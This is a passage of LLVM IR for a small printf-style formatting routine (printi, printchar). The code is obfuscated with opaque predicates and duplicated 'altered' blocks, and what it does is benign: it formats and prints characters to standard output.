  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %19, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %19, align 4
  %48 = load i32, i32* @x.103
  %49 = load i32, i32* @y.104
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %56

; <label>:56:                                     ; preds = %originalBBpart29
  %57 = load i32, i32* @x.103
  %58 = load i32, i32* @y.104
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %56
  %65 = load i8*, i8** %20, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %20, align 8
  %67 = load i32, i32* @x.103
  %68 = load i32, i32* @y.104
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %33

; <label>:75:                                     ; preds = %33
  %76 = load i32, i32* @x.103
  %77 = load i32, i32* @y.104
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %75
  %84 = load i32, i32* %19, align 4
  %85 = load i32, i32* %15, align 4
  %86 = icmp sge i32 %84, %85
  %87 = load i32, i32* @x.103
  %88 = load i32, i32* @y.104
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %86, label %95, label %96

; <label>:95:                                     ; preds = %originalBBpart217
  store i32 0, i32* %15, align 4
  br label %100

; <label>:96:                                     ; preds = %originalBBpart217
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %15, align 4
  %99 = sub nsw i32 %98, %97
  store i32 %99, i32* %15, align 4
  br label %100

; <label>:100:                                    ; preds = %96, %95
  %101 = load i32, i32* %16, align 4
  %102 = and i32 %101, 2
  %103 = icmp ne i32 %102, 0
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  store i32 48, i32* %18, align 4
  br label %105

; <label>:105:                                    ; preds = %104, %100
  %106 = load i32, i32* @x.103
  %107 = load i32, i32* @y.104
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %105
  %114 = load i32, i32* @x.103
  %115 = load i32, i32* @y.104
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %122

; <label>:122:                                    ; preds = %originalBBpart221, %originalBBpart2
  %123 = load i32, i32* %16, align 4
  %124 = and i32 %123, 1
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %155, label %126

; <label>:126:                                    ; preds = %122
  br label %127

; <label>:127:                                    ; preds = %151, %126
  %128 = load i32, i32* %15, align 4
  %129 = icmp sgt i32 %128, 0
  br i1 %129, label %130, label %154

; <label>:130:                                    ; preds = %127
  %131 = load i32, i32* @x.103
  %132 = load i32, i32* @y.104
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %130
  %139 = load i8**, i8*** %13, align 8
  %140 = load i32, i32* %18, align 4
  call void @printchar(i8** %139, i32 %140)
  %141 = load i32, i32* %17, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %17, align 4
  %143 = load i32, i32* @x.103
  %144 = load i32, i32* @y.104
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart233, label %originalBB23alteredBB

originalBBpart233:                                ; preds = %originalBB23
  br label %151

; <label>:151:                                    ; preds = %originalBBpart233
  %152 = load i32, i32* %15, align 4
  %153 = add nsw i32 %152, -1
  store i32 %153, i32* %15, align 4
  br label %127

; <label>:154:                                    ; preds = %127
  br label %155

; <label>:155:                                    ; preds = %154, %122
  %156 = load i32, i32* @x.103
  %157 = load i32, i32* @y.104
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %155
  %164 = load i32, i32* @x.103
  %165 = load i32, i32* @y.104
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %172

; <label>:172:                                    ; preds = %199, %originalBBpart237
  %173 = load i32, i32* @x.103
  %174 = load i32, i32* @y.104
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %172
  %181 = load i8*, i8** %14, align 8
  %182 = load i8, i8* %181, align 1
  %183 = icmp ne i8 %182, 0
  %184 = load i32, i32* @x.103
  %185 = load i32, i32* @y.104
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %183, label %192, label %202

; <label>:192:                                    ; preds = %originalBBpart241
  %193 = load i8**, i8*** %13, align 8
  %194 = load i8*, i8** %14, align 8
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  call void @printchar(i8** %193, i32 %196)
  %197 = load i32, i32* %17, align 4
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %17, align 4
  br label %199

; <label>:199:                                    ; preds = %192
  %200 = load i8*, i8** %14, align 8
  %201 = getelementptr inbounds i8, i8* %200, i32 1
  store i8* %201, i8** %14, align 8
  br label %172

; <label>:202:                                    ; preds = %originalBBpart241
  %203 = load i32, i32* @x.103
  %204 = load i32, i32* @y.104
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %202
  %211 = load i32, i32* @x.103
  %212 = load i32, i32* @y.104
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %219

; <label>:219:                                    ; preds = %243, %originalBBpart245
  %220 = load i32, i32* %15, align 4
  %221 = icmp sgt i32 %220, 0
  br i1 %221, label %222, label %246

; <label>:222:                                    ; preds = %219
  %223 = load i32, i32* @x.103
  %224 = load i32, i32* @y.104
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %222
  %231 = load i8**, i8*** %13, align 8
  %232 = load i32, i32* %18, align 4
  call void @printchar(i8** %231, i32 %232)
  %233 = load i32, i32* %17, align 4
  %234 = add nsw i32 %233, 1
  store i32 %234, i32* %17, align 4
  %235 = load i32, i32* @x.103
  %236 = load i32, i32* @y.104
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBBpart251, label %originalBB47alteredBB

originalBBpart251:                                ; preds = %originalBB47
  br label %243

; <label>:243:                                    ; preds = %originalBBpart251
  %244 = load i32, i32* %15, align 4
  %245 = add nsw i32 %244, -1
  store i32 %245, i32* %15, align 4
  br label %219

; <label>:246:                                    ; preds = %219
  %247 = load i32, i32* %17, align 4
  ret i32 %247

originalBBalteredBB:                              ; preds = %originalBB, %4
  %248 = alloca i8**, align 8
  %249 = alloca i8*, align 8
  %250 = alloca i32, align 4
  %251 = alloca i32, align 4
  %252 = alloca i32, align 4
  %253 = alloca i32, align 4
  %254 = alloca i32, align 4
  %255 = alloca i8*, align 8
  store i8** %0, i8*** %248, align 8
  store i8* %1, i8** %249, align 8
  store i32 %2, i32* %250, align 4
  store i32 %3, i32* %251, align 4
  store i32 0, i32* %252, align 4
  store i32 32, i32* %253, align 4
  %256 = load i32, i32* %250, align 4
  %257 = icmp sgt i32 %256, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %258 = load i32, i32* %19, align 4
  %_ = sub i32 %258, 1
  %gen = mul i32 %_, 1
  %_2 = shl i32 %258, 1
  %_3 = sub i32 %258, 1
  %gen4 = mul i32 %_3, 1
  %_5 = shl i32 %258, 1
  %_6 = sub i32 %258, 1
  %gen7 = mul i32 %_6, 1
  %259 = add nsw i32 %258, 1
  store i32 %259, i32* %19, align 4
  br label %originalBB1

originalBB11alteredBB:                            ; preds = %originalBB11, %56
  %260 = load i8*, i8** %20, align 8
  %261 = getelementptr inbounds i8, i8* %260, i32 1
  store i8* %261, i8** %20, align 8
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %75
  %262 = load i32, i32* %19, align 4
  %263 = load i32, i32* %15, align 4
  %264 = icmp sge i32 %262, %263
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %105
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %130
  %265 = load i8**, i8*** %13, align 8
  %266 = load i32, i32* %18, align 4
  call void @printchar(i8** %265, i32 %266)
  %267 = load i32, i32* %17, align 4
  %_24 = sub i32 0, %267
  %gen25 = add i32 %_24, 1
  %_26 = shl i32 %267, 1
  %_27 = shl i32 %267, 1
  %_28 = shl i32 %267, 1
  %_29 = shl i32 %267, 1
  %_30 = sub i32 %267, 1
  %gen31 = mul i32 %_30, 1
  %268 = add nsw i32 %267, 1
  store i32 %268, i32* %17, align 4
  br label %originalBB23

originalBB35alteredBB:                            ; preds = %originalBB35, %155
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %172
  %269 = load i8*, i8** %14, align 8
  %270 = load i8, i8* %269, align 1
  %271 = icmp ne i8 %270, 0
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %202
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %222
  %272 = load i8**, i8*** %13, align 8
  %273 = load i32, i32* %18, align 4
  call void @printchar(i8** %272, i32 %273)
  %274 = load i32, i32* %17, align 4
  %_48 = sub i32 %274, 1
  %gen49 = mul i32 %_48, 1
  %275 = add nsw i32 %274, 1
  store i32 %275, i32* %17, align 4
  br label %originalBB47
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %198

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = load i32, i32* @x.105
  %47 = load i32, i32* @y.106
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %55 = getelementptr inbounds i8, i8* %54, i64 12
  %56 = getelementptr inbounds i8, i8* %55, i64 -1
  store i8* %56, i8** %17, align 8
  %57 = load i8*, i8** %17, align 8
  store i8 0, i8* %57, align 1
  %58 = load i32, i32* @x.105
  %59 = load i32, i32* @y.106
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %66

; <label>:66:                                     ; preds = %97, %originalBBpart2
  %67 = load i32, i32* @x.105
  %68 = load i32, i32* @y.106
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i32, i32* %21, align 4
  %76 = icmp ne i32 %75, 0
  %77 = load i32, i32* @x.105
  %78 = load i32, i32* @y.106
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %76, label %85, label %106

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* %21, align 4
  %87 = load i32, i32* %11, align 4
  %88 = urem i32 %86, %87
  store i32 %88, i32* %18, align 4
  %89 = load i32, i32* %18, align 4
  %90 = icmp sge i32 %89, 10
  br i1 %90, label %91, label %97

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* %15, align 4
  %93 = sub nsw i32 %92, 48
  %94 = sub nsw i32 %93, 10
  %95 = load i32, i32* %18, align 4
  %96 = add nsw i32 %95, %94
  store i32 %96, i32* %18, align 4
  br label %97

; <label>:97:                                     ; preds = %91, %85
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, 48
  %100 = trunc i32 %99 to i8
  %101 = load i8*, i8** %17, align 8
  %102 = getelementptr inbounds i8, i8* %101, i32 -1
  store i8* %102, i8** %17, align 8
  store i8 %100, i8* %102, align 1
  %103 = load i32, i32* %11, align 4
  %104 = load i32, i32* %21, align 4
  %105 = udiv i32 %104, %103
  store i32 %105, i32* %21, align 4
  br label %66

; <label>:106:                                    ; preds = %originalBBpart24
  %107 = load i32, i32* @x.105
  %108 = load i32, i32* @y.106
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %106
  %115 = load i32, i32* %19, align 4
  %116 = icmp ne i32 %115, 0
  %117 = load i32, i32* @x.105
  %118 = load i32, i32* @y.106
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %116, label %125, label %174

; <label>:125:                                    ; preds = %originalBBpart28
  %126 = load i32, i32* %13, align 4
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %170

; <label>:128:                                    ; preds = %125
  %129 = load i32, i32* @x.105
  %130 = load i32, i32* @y.106
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %128
  %137 = load i32, i32* %14, align 4
  %138 = and i32 %137, 2
  %139 = icmp ne i32 %138, 0
  %140 = load i32, i32* @x.105
  %141 = load i32, i32* @y.106
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart224, label %originalBB10alteredBB

originalBBpart224:                                ; preds = %originalBB10
  br i1 %139, label %148, label %170

; <label>:148:                                    ; preds = %originalBBpart224
  %149 = load i32, i32* @x.105
  %150 = load i32, i32* @y.106
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %148
  %157 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %157, i32 45)
  %158 = load i32, i32* %20, align 4
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %20, align 4
  %160 = load i32, i32* %13, align 4
  %161 = add nsw i32 %160, -1
  store i32 %161, i32* %13, align 4
  %162 = load i32, i32* @x.105
  %163 = load i32, i32* @y.106
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart245, label %originalBB26alteredBB

originalBBpart245:                                ; preds = %originalBB26
  br label %173

; <label>:170:                                    ; preds = %originalBBpart224, %125
  %171 = load i8*, i8** %17, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 -1
  store i8* %172, i8** %17, align 8
  store i8 45, i8* %172, align 1
  br label %173

; <label>:173:                                    ; preds = %170, %originalBBpart245
  br label %174

; <label>:174:                                    ; preds = %173, %originalBBpart28
  %175 = load i32, i32* @x.105
  %176 = load i32, i32* @y.106
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %174
  %183 = load i32, i32* %20, align 4
  %184 = load i8**, i8*** %9, align 8
  %185 = load i8*, i8** %17, align 8
  %186 = load i32, i32* %13, align 4
  %187 = load i32, i32* %14, align 4
  %188 = call i32 @prints(i8** %184, i8* %185, i32 %186, i32 %187)
  %189 = add nsw i32 %183, %188
  store i32 %189, i32* %8, align 4
  %190 = load i32, i32* @x.105
  %191 = load i32, i32* @y.106
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart255, label %originalBB47alteredBB

originalBBpart255:                                ; preds = %originalBB47
  br label %198

; <label>:198:                                    ; preds = %originalBBpart255, %25
  %199 = load i32, i32* %8, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %45
  %200 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %201 = getelementptr inbounds i8, i8* %200, i64 12
  %202 = getelementptr inbounds i8, i8* %201, i64 -1
  store i8* %202, i8** %17, align 8
  %203 = load i8*, i8** %17, align 8
  store i8 0, i8* %203, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %204 = load i32, i32* %21, align 4
  %205 = icmp ne i32 %204, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %106
  %206 = load i32, i32* %19, align 4
  %207 = icmp ne i32 %206, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %128
  %208 = load i32, i32* %14, align 4
  %_ = shl i32 %208, 2
  %_11 = sub i32 %208, 2
  %gen = mul i32 %_11, 2
  %_12 = shl i32 %208, 2
  %_13 = shl i32 %208, 2
  %_14 = sub i32 0, %208
  %gen15 = add i32 %_14, 2
  %_16 = sub i32 %208, 2
  %gen17 = mul i32 %_16, 2
  %_18 = sub i32 %208, 2
  %gen19 = mul i32 %_18, 2
  %_20 = shl i32 %208, 2
  %_21 = sub i32 0, %208
  %gen22 = add i32 %_21, 2
  %209 = and i32 %208, 2
  %210 = icmp ne i32 %209, 0
  br label %originalBB10

originalBB26alteredBB:                            ; preds = %originalBB26, %148
  %211 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %211, i32 45)
  %212 = load i32, i32* %20, align 4
  %_27 = shl i32 %212, 1
  %_28 = sub i32 %212, 1
  %gen29 = mul i32 %_28, 1
  %_30 = sub i32 0, %212
  %gen31 = add i32 %_30, 1
  %_32 = shl i32 %212, 1
  %_33 = sub i32 0, %212
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 %212, 1
  %gen36 = mul i32 %_35, 1
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %20, align 4
  %214 = load i32, i32* %13, align 4
  %_37 = sub i32 %214, -1
  %gen38 = mul i32 %_37, -1
  %_39 = shl i32 %214, -1
  %_40 = shl i32 %214, -1
  %_41 = sub i32 0, %214
  %gen42 = add i32 %_41, -1
  %_43 = shl i32 %214, -1
  %215 = add nsw i32 %214, -1
  store i32 %215, i32* %13, align 4
  br label %originalBB26

originalBB47alteredBB:                            ; preds = %originalBB47, %174
  %216 = load i32, i32* %20, align 4
  %217 = load i8**, i8*** %9, align 8
  %218 = load i8*, i8** %17, align 8
  %219 = load i32, i32* %13, align 4
  %220 = load i32, i32* %14, align 4
  %221 = call i32 @prints(i8** %217, i8* %218, i32 %219, i32 %220)
  %_48 = shl i32 %216, %221
  %_49 = shl i32 %216, %221
  %_50 = sub i32 %216, %221
  %gen51 = mul i32 %_50, %221
  %_52 = sub i32 0, %216
  %gen53 = add i32 %_52, %221
  %222 = add nsw i32 %216, %221
  store i32 %222, i32* %8, align 4
  br label %originalBB47
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %34

; <label>:15:                                     ; preds = %2
  %16 = load i32, i32* @x.107
  %17 = load i32, i32* @y.108
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = bitcast i32* %4 to i8*
  %25 = call i64 @write(i32 1, i8* %24, i64 1)
  %26 = load i32, i32* @x.107
  %27 = load i32, i32* @y.108
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2, %7
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %15
  %35 = bitcast i32* %4 to i8*
  %36 = call i64 @write(i32 1, i8* %35, i64 1)
  br label %originalBB
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
